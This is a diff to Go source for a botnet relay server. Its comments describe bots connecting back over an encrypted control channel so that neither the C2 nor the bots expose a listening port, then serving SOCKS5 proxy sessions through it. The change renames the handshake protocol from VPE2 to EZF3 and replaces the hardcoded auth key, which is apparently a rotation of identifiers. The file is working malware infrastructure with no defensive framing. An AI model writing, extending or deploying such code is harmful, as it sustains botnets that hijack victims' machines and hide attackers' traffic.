@@ -29,10 +29,10 @@ import (
 // (backconnect), so neither the C2 nor the bot exposes a listening port.
 //
 // Protocol:
-//   Bot -> Relay (VPE2):  "RELAY_AUTH:<key>:<botID>\n"   -> control channel
+//   Bot -> Relay (EZF3):  "RELAY_AUTH:<key>:<botID>\n"   -> control channel
 //   Relay -> Bot:              "RELAY_OK\n"
 //   Relay -> Bot:              "RELAY_NEW:<sessionID>\n"      -> new client waiting
-//   Bot -> Relay (VPE2):  "RELAY_DATA:<sessionID>\n"     -> data channel
+//   Bot -> Relay (EZF3):  "RELAY_DATA:<sessionID>\n"     -> data channel
 //   Bot runs SOCKS5 protocol over the data channel.
 //
 // Usage:
@@ -68,7 +68,7 @@ var (
 // CONFIG -- patched by setup.py at build time
 // ============================================================================
 
-var defaultAuthKey = "slQVVAqOrkWEti*X"   //setup:authkey
+var defaultAuthKey = "UZq1tckrZ0dC1lvQ"   //setup:authkey
 var defaultControlPort = "9001"             //setup:cp
 var defaultSocksPort = "1080"               //setup:sp
 var defaultStatsAddr = ""                   //setup:stats
@@ -138,7 +138,7 @@ func relayAuthBlock(ip string) {
 }
 
 func main() {
-	controlPort := flag.String("cp", defaultControlPort, "Control port (VPE2)")
+	controlPort := flag.String("cp", defaultControlPort, "Control port (EZF3)")
 	socksPort := flag.String("sp", defaultSocksPort, "SOCKS5 port")
 	authKey := flag.String("key", "", "Auth key override")
 	statsAddr := flag.String("stats", defaultStatsAddr, "Stats API endpoint (e.g. 0.0.0.0:9090)")
@@ -213,7 +213,7 @@ func main() {
 }
 
 // ============================================================================
-// CONTROL PORT — bots connect here (VPE2 encrypted TCP)
+// CONTROL PORT — bots connect here (EZF3 encrypted TCP)
 // ============================================================================
 
 func controlListener(port, authKey string) {
@@ -221,16 +221,16 @@ func controlListener(port, authKey string) {
 	if err != nil {
 		log.Fatalf("[RELAY] Control listen failed on :%s: %v", port, err)
 	}
-	log.Printf("[RELAY] Control port :%s (VPE2) — waiting for bots", port)
+	log.Printf("[RELAY] Control port :%s (EZF3) — waiting for bots", port)
 	for {
 		conn, err := ln.Accept()
 		if err != nil {
 			continue
 		}
 		go func(c net.Conn) {
-			encrypted, err := HandleVPE2Handshake(c, authKey)
+			encrypted, err := HandleEZF3Handshake(c, authKey)
 			if err != nil {
-				log.Printf("[RELAY] VPE2 failed from %s: %v", c.RemoteAddr(), err)
+				log.Printf("[RELAY] EZF3 failed from %s: %v", c.RemoteAddr(), err)
 				c.Close()
 				return
 			}
